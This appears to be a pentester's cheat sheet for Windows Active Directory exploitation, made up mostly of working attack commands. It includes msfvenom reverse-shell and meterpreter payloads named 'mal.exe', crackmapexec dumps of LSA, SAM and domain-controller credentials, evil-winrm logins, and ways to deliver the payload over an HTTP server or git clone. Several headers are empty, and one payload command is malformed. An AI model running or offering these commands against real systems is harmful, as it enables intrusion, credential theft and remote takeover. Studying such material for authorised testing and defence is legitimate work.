https://casvancooten.com/posts/2020/11/windows-active-directory-exploitation-cheat-sheet-and-command-reference/
#### Unquoted Service Path
Find vulnerable services using PowerShell:
`Get-WmiObject -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select Name,DisplayName,StartMode,PathName`
- [ ] `.lnk` files
- [ ] WTFBins
- [ ] BloodHound/SharpHound
- [ ] WinPEAS
Check write permissions in directory before the space: 
`Get-Acl C:\DirectoryName\`
Generate payload:
`msfvenom -p windows/x64/shell/reverse_tcp LHOST=127.0.0.1 LPORT=9001 -f exe-service -o mal.exe`
- [ ] Petit Pottam
- [ ] DLL Hijacking
- [ ] DLL Sideloading
- [ ] DLL Injection
- [ ] PowerShell Exec Bypass Visual Studio
#### Access
##### AppDomain 
##### LOLBins
##### WinRM Shell
Port 5985 open, with credentials
- `evil-winrm -i <IP_ADDRESS> -u <USERNAME> -p <PASSWORD>`
#### Privilege Escalation
##### Unquoted Service Path
##### Credential Caches
Dump credential caches
- `crackmapexec smb 127.0.0.1 -u $username -p $password --lsa`
- `crackmapexec smb 127.0.0.1 -u $username -p $password --sam`
Clone domain controller
- `crackmapexec smb 127.0.0.1 -u $username -p $password --ntds --users --enabled` (Requires DA, don't use this without permission from the client)
##### Named Pipe Exploits
##### Privilege Abuse
`SeImpersonate` or `SeAssignPrimaryToken` 
- RottenPotato, JuicyPotato, RoguePotato, PrintSpoofer, and SharpEfsPotato
##### Dropping Malware
Check write permissions in directory before the space: 
- `Get-Acl C:\DirectoryName\`
Generate payload:
- `msfvenom -p windows/x64/shell/reverse_tcp LHOST=127.0.0.1 LPORT=9001 -f exe-service -o mal.exe`
- `msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=9001 -f exe -i mal.exe
###### Python HTTP Server
Serve folder locally:
- `python3 -m http.server`
Retrieve Payload:
- `iwr -uri http://127.0.0.1:8000/mal.exe -outfile mal.exe -usebasicparsing`
###### Git Clone
Set up git repo locally:
- `git init`
- `git add . && git commit -m "commit 1"`
- `cd .git && git --bare update-server-info && cd ..`
- `python3 -m http.server`
Retrieve Payload:
- `git clone http://127.0.0.1:8000/.git/`